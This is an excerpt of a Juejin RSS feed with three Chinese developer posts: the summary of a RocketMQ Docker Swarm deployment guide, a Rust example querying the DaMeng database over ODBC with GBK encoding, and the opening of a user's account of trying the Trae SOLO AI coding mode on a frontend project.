<h2 data-id="heading-35">总结</h2>
<p>通过本文的详细步骤，您已成功将 RocketMQ 微服务项目从单机 Docker Compose 部署升级为高可用的 Docker Swarm 集群部署。关键改进包括：</p>
<ol>
<li><strong>✅ 高可用性</strong>：多节点部署，自动故障转移</li>
<li><strong>✅ 弹性伸缩</strong>：无状态服务水平扩展，有状态服务稳定运行</li>
<li><strong>✅ 服务发现</strong>：覆盖网络实现跨主机服务通信</li>
<li><strong>✅ 滚动更新</strong>：零停机部署新版本</li>
<li><strong>✅ 资源管理</strong>：精细化的CPU/内存控制</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[达梦 数据库 Rust 实战]]></title>    <link>https://juejin.cn/post/7575910333400350774</link>    <guid>https://juejin.cn/post/7575910333400350774</guid>    <pubDate>2025-11-24T06:53:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575910333400350774" data-draft-id="7575910333400301622" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="达梦 数据库 Rust 实战"/> <meta itemprop="keywords" content="Rust,数据分析,数据库"/> <meta itemprop="datePublished" content="2025-11-24T06:53:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Andrew_Ryan"/> <meta itemprop="url" content="https://juejin.cn/user/3993068510655703"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            达梦 数据库 Rust 实战
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3993068510655703/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Andrew_Ryan
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T06:53:07.000Z" title="Mon Nov 24 2025 06:53:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c2e7c8103cd249a8ae8df5e2e82816e2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5kcmV3X1J5YW4=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764571986&amp;x-signature=TjikhZudy0OV9Ujgy%2BP8cv3e5MU%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/466c8b6864564d5fa37f7c8d47d525e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5kcmV3X1J5YW4=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764571986&amp;x-signature=5KzUscub70mPJ4NEOA8PBeS%2FfYw%3D" alt="image.png" loading="lazy"/></p>
<p><code>Cargo.toml</code></p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[package]</span>
<span class="hljs-attr">name</span> = <span class="hljs-string">"dameng_rust_demo"</span>
<span class="hljs-attr">version</span> = <span class="hljs-string">"0.1.0"</span>
<span class="hljs-attr">edition</span> = <span class="hljs-string">"2024"</span>



<span class="hljs-section">[dependencies]</span>
<span class="hljs-attr">odbc-api</span> = { version = <span class="hljs-string">"8.1.4"</span>, features = [<span class="hljs-string">"derive"</span>] }
<span class="hljs-attr">env_logger</span> = <span class="hljs-string">"0.11"</span>
<span class="hljs-attr">anyhow</span> = <span class="hljs-string">"1.0.100"</span>
<span class="hljs-attr">encoding_rs</span> = <span class="hljs-string">"0.8"</span>
</code></pre>
<p><code>main.rs</code></p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> anyhow::<span class="hljs-type">Result</span>;
<span class="hljs-keyword">use</span> odbc_api::{
    ConnectionOptions, Environment,
    parameter::VarCharArray,
};
<span class="hljs-keyword">use</span> encoding_rs::GBK;

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;()&gt; {
    <span class="hljs-comment">// Initialize logging</span>
    env_logger::<span class="hljs-title function_ invoke__">init</span>();

    <span class="hljs-comment">// Create ODBC environment</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">env</span> = Environment::<span class="hljs-title function_ invoke__">new</span>()?;

    <span class="hljs-comment">// DaMeng database connection string</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">connection_string</span> = <span class="hljs-string">"
        Driver={DM8 ODBC DRIVER};
        Server=localhost;
        Port=5236;
        UID=SYSDBA;
        PWD=my_passowrd;
    "</span>;

    <span class="hljs-comment">// Establish connection with proper error handling</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">conn</span> = env
        .<span class="hljs-title function_ invoke__">connect_with_connection_string</span>(connection_string, ConnectionOptions::<span class="hljs-title function_ invoke__">default</span>())
        .<span class="hljs-title function_ invoke__">map_err</span>(|e| anyhow::anyhow!(<span class="hljs-string">"Failed to connect: {:?}"</span>, e))?;

    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"✓ Successfully connected to DaMeng database"</span>);

    <span class="hljs-comment">// Get database info</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">dbms_name</span> = conn.<span class="hljs-title function_ invoke__">database_management_system_name</span>()?;
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Database Management System Name: {}"</span>, dbms_name);

    <span class="hljs-comment">// Execute query and process results</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">max_rows_in_batch</span> = <span class="hljs-number">250</span>;
    
    <span class="hljs-comment">// Define row type as a tuple (even for single columns)</span>
    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Row</span> = (VarCharArray&lt;<span class="hljs-number">255</span>&gt;, VarCharArray&lt;<span class="hljs-number">255</span>&gt;);
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">buffer</span> = odbc_api::buffers::RowVec::&lt;Row&gt;::<span class="hljs-title function_ invoke__">new</span>(max_rows_in_batch);

    <span class="hljs-comment">// 将中文字符串转换为GBK编码</span>
    <span class="hljs-keyword">let</span> (gbk_bytes, _, had_errors) = GBK.<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-string">"张三"</span>);
    <span class="hljs-keyword">if</span> had_errors {
        eprintln!(<span class="hljs-string">"Warning: Some characters could not be encoded to GBK"</span>);
    }
    
    <span class="hljs-comment">// 使用GBK编码的字节数组创建参数</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">name_param</span> = odbc_api::parameter::VarCharArray::&lt;<span class="hljs-number">255</span>&gt;::<span class="hljs-title function_ invoke__">new</span>(&amp;gbk_bytes);
    
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">cursor</span> = conn
        .<span class="hljs-title function_ invoke__">execute</span>(<span class="hljs-string">"SELECT * FROM SYSDBA.CHAR_TEST WHERE name=?"</span>, (&amp;name_param,))?
        .<span class="hljs-title function_ invoke__">ok_or_else</span>(|| anyhow::anyhow!(<span class="hljs-string">"SELECT query did not yield a result set"</span>))?;
    
    <span class="hljs-keyword">use</span> odbc_api::Cursor;
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">block_cursor</span> = cursor.<span class="hljs-title function_ invoke__">bind_buffer</span>(&amp;<span class="hljs-keyword">mut</span> buffer)?;

    <span class="hljs-keyword">while</span> <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">Some</span>(batch) = block_cursor.<span class="hljs-title function_ invoke__">fetch</span>()? {
        <span class="hljs-comment">// Iterate over rows in the batch</span>
        <span class="hljs-keyword">for</span> <span class="hljs-variable">row</span> <span class="hljs-keyword">in</span> batch.<span class="hljs-title function_ invoke__">iter</span>() {
            <span class="hljs-keyword">let</span> (name, age) = row;
            
            <span class="hljs-comment">// 处理name字段</span>
            <span class="hljs-keyword">match</span> name.<span class="hljs-title function_ invoke__">as_bytes</span>() {
                <span class="hljs-title function_ invoke__">Some</span>(bytes) <span class="hljs-keyword">if</span> !bytes.<span class="hljs-title function_ invoke__">is_empty</span>() =&gt; {
                    <span class="hljs-comment">// 尝试解码为UTF-8，如果失败则尝试GBK</span>
                    <span class="hljs-keyword">match</span> std::<span class="hljs-type">str</span>::<span class="hljs-title function_ invoke__">from_utf8</span>(bytes) {
                        <span class="hljs-title function_ invoke__">Ok</span>(utf8_str) =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Name (UTF-8): {}"</span>, utf8_str),
                        <span class="hljs-title function_ invoke__">Err</span>(_) =&gt; {
                            <span class="hljs-keyword">let</span> (decoded, _, _) = GBK.<span class="hljs-title function_ invoke__">decode</span>(bytes);
                            <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Name (GBK): {}"</span>, decoded);
                        }
                    }
                }
                <span class="hljs-title function_ invoke__">Some</span>(_) =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Name: NULL"</span>),
                <span class="hljs-literal">None</span> =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Name: NULL"</span>),
            }
            
            <span class="hljs-comment">// 处理age字段</span>
            <span class="hljs-keyword">match</span> age.<span class="hljs-title function_ invoke__">as_bytes</span>() {
                <span class="hljs-title function_ invoke__">Some</span>(bytes) <span class="hljs-keyword">if</span> !bytes.<span class="hljs-title function_ invoke__">is_empty</span>() =&gt; {
                    <span class="hljs-keyword">match</span> std::<span class="hljs-type">str</span>::<span class="hljs-title function_ invoke__">from_utf8</span>(bytes) {
                        <span class="hljs-title function_ invoke__">Ok</span>(utf8_str) =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Age (UTF-8): {}"</span>, utf8_str),
                        <span class="hljs-title function_ invoke__">Err</span>(_) =&gt; {
                            <span class="hljs-keyword">let</span> (decoded, _, _) = GBK.<span class="hljs-title function_ invoke__">decode</span>(bytes);
                            <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Age (GBK): {}"</span>, decoded);
                        }
                    }
                }
                <span class="hljs-title function_ invoke__">Some</span>(_) =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Age: NULL"</span>),
                <span class="hljs-literal">None</span> =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Age: NULL"</span>),
            }
            <span class="hljs-built_in">println!</span>(<span class="hljs-string">"---"</span>);
        }
    }

    <span class="hljs-title function_ invoke__">Ok</span>(())
}
</code></pre>
<pre><code class="hljs language-sh" lang="sh">✓ Successfully connected to DaMeng database
Database Management System Name: 达梦数据库管理系统
Name (GBK): 张三
Age (UTF-8): 29
---
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Trae SOLO项目真实需求]]></title>    <link>https://juejin.cn/post/7572997791451611174</link>    <guid>https://juejin.cn/post/7572997791451611174</guid>    <pubDate>2025-11-17T02:42:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7572997791451611174" data-draft-id="7572115057221369891" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Trae SOLO项目真实需求"/> <meta itemprop="keywords" content="Trae,前端,前端工程化"/> <meta itemprop="datePublished" content="2025-11-17T02:42:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="草帽lufei"/> <meta itemprop="url" content="https://juejin.cn/user/501033035632093"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Trae SOLO项目真实需求
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/501033035632093/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    草帽lufei
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-17T02:42:42.000Z" title="Mon Nov 17 2025 02:42:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-17
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    53
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;color:#3c9dff}.markdown-body h1{font-size:30px;margin-bottom:5px;padding-bottom:8px;text-align:center}.markdown-body h2{font-size:24px;padding-bottom:6px}.markdown-body h2:before{content:"🍋"}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h3:before{content:"🍓"}.markdown-body h4{font-size:16px}.markdown-body h4:before{content:"🍑"}.markdown-body h5{font-size:15px}.markdown-body h5:before{content:"🍉"}.markdown-body h6{margin-top:5px}.markdown-body h6:before{content:"🍒"}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;margin:0 auto;max-width:100%;border-radius:4px;padding:1px;border:1px solid #d2e8ff}.markdown-body img:hover{box-shadow:0 1px 3px #5eaeff}.markdown-body hr{height:4px;margin:34px 0;background-size:4px 1px;background-image:linear-gradient(270deg,#5eaeff,#f3f9ff 25%,transparent 50%);border-style:none}.markdown-body code{word-break:break-word;border-radius:3px;overflow-x:auto;background-color:#d2e8ff;color:#3c9dff;font-size:.9em;padding:.1em .5em;margin:0 3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;transition:all .3s}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:1px solid #90c7ff;border-radius:4px}.markdown-body pre:hover{box-shadow:0 1px 10px #beddff}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#3c9dff;border-bottom:1px solid #90c7ff;transition:all .3s}.markdown-body a:hover{color:#007fff;border-bottom:2px solid #5eaeff}.markdown-body a[href]:not(:empty){padding-right:18px}.markdown-body a[href]:not(:empty):after{display:inline-block;width:16px;height:16px;margin-left:2px;content:"";background:url(data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxwYXRoIGQ9Ik0zODQgMTI4YTQ4IDQ4IDAgMDEyLjgxNiA5NS45MkwzODQgMjI0SDI1NmEzMiAzMiAwIDAwLTMxLjkyIDI5LjZMMjI0IDI1NnY1MTJhMzIgMzIgMCAwMDI5LjYgMzEuOTJsMi40LjA4aDUxMmEzMiAzMiAwIDAwMzEuOTItMjkuNmwuMDgtMi40VjY1NmE0OCA0OCAwIDAxOTUuOTItMi44MTZMODk2IDY1NnYxMTJhMTI4IDEyOCAwIDAxLTEyNCAxMjcuOTM2bC00IC4wNjRIMjU2YTEyOCAxMjggMCAwMS0xMjcuOTM2LTEyNGwtLjA2NC00VjI1NmExMjggMTI4IDAgMDExMjQtMTI3LjkzNmw0LS4wNjRoMTI4em0zODQgMGExMjggMTI4IDAgMDExMjcuOTM2IDEyNGwuMDY0IDR2MTYwYTQ4IDQ4IDAgMDEtOTUuOTIgMi44MTZMODAwIDQxNlYyOTEuODcybC0zODIuMDY0IDM4Mi4wOGE0OCA0OCAwIDAxLTcwLjAzMi02NS42bDIuMTYtMi4yODhMNzMyLjA5NiAyMjRINjA4YTQ4IDQ4IDAgMDEtMi44MTYtOTUuOTJMNjA4IDEyOGgxNjB6IiBmaWxsPSIjM2M5ZGZmIiBmaWxsLW9wYWNpdHk9Ii41NiIgZGF0YS1zcG0tYW5jaG9yLWlkPSJhMzEzeC5zZWFyY2hfaW5kZXguMC5pMC41Yzc1M2E4MTgwa2RKWCIgY2xhc3M9InNlbGVjdGVkIi8+PC9zdmc+);background-size:100%}.markdown-body table{margin:0 auto 10px;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border:1px solid #3c9dff}.markdown-body thead{text-align:center}.markdown-body thead th{color:#fff;background-color:#5eaeff}.markdown-body tr{text-align:center}.markdown-body tbody tr:hover{background-color:#d2e8ff}.markdown-body tbody tr:hover code{background-color:#90c7ff}.markdown-body tr:nth-child(2n){background-color:#ecf5ff}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5eaeff}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{font-weight:900;padding:0 1px;font-size:17px}.markdown-body small{color:#cbcbcb;padding:0 1px;font-size:22px;zoom:.5}.markdown-body em{padding:0 1px}.markdown-body del{padding:0 1px;text-decoration-thickness:2px}.markdown-body blockquote{color:#1a1b1c;padding:1px 20px;margin:22px 0;border-radius:4px;border-left:4px solid rgba(60,157,255,.5);background-color:rgba(190,221,255,.3)}.markdown-body blockquote blockquote{margin:8px 0}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{margin:12px 0;padding:4px 10px;border:2px solid #3c9dff;border-radius:8px;background-color:#ecf5ff;transition:all .3s}.markdown-body details summary{cursor:pointer}.markdown-body input[type=checkbox]{position:relative;appearance:none;width:16px;height:16px;border-radius:2px;vertical-align:middle;transform:translateY(-2px);box-sizing:border-box;border:1px solid #beddff}.markdown-body input[type=checkbox]:checked{border:1px solid #5eaeff;background-color:#5eaeff}.markdown-body input[type=checkbox]:checked:before{position:absolute;top:3px;left:1px;width:11px;height:6px;background-color:transparent;border-left:2px solid #fff;border-bottom:2px solid #fff;transform:rotate(-45deg);content:"";box-sizing:border-box}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">前言</h2>
<p>看到 Trae SOLO 模式限时免费了，趁着免费，赶紧体验一波，Demo 什么的就不试了，直接用 SOLO 模式 SOLO 业务项目，开干，最终目标都是要服务于业务项目的</p>
<p>我是一吊毛前端开发，就从当前做的前端项目开用吧，接下来干的活是改大屏页，就从大屏页面开始，普通业务逻辑的话各路 AI 可能表现都还行，之前测试的是大屏这种明显靠感觉的还是差点意思，大屏页面基本主要还是手动改</p>
<h2 data-id="heading-1">使用 SOLO</h2>
<h3 data-id="heading-2">界面分析</h3>
<p>更新 Trae 后打开项目，分为4大块，从左到右分别是 SOLO模式任务，对话区，代码区，资源管理器，这点和常见的编辑器默认排版刚好相反，不过无所谓，既然这么设计，肯定是有他的道理的，因为现在模式变了，主要以对话，任务描述为主，然后再看代码</p>
<h3 data-id="heading-3">开始对话</h3>
<p>下面是我运行项目后，先在对话区先让它把一个页面的 tab 选项卡默认值改一下，它会自动检索项目代码，然后根据描述默认直接变更代码，然后最左侧任务会自动根据任务内容生成一个任务名称</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f732a2c7e03e413b9c6094df91daf255~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557009&amp;x-signature=OOcH3d8aqXsqbEkamsD3alBo7ik%3D" alt="image.png" loading="lazy"/></p>
<p>我发现 SOLO Coder 是自动就把项目代码变更了的，这里有个选项，就是用户确认后改代码和自动直接改代码，把这个确认加上了，防止把项目给改崩了，不好还原了，之前遇到过的痛苦经历，用 Agent 改代码，结果崩了，还自动改了，但是只改了半截，还原也只能还原半截，因为涉及了好几个文件，我手动吭哧吭哧忙活半天才恢复，整的都有阴影了</p>
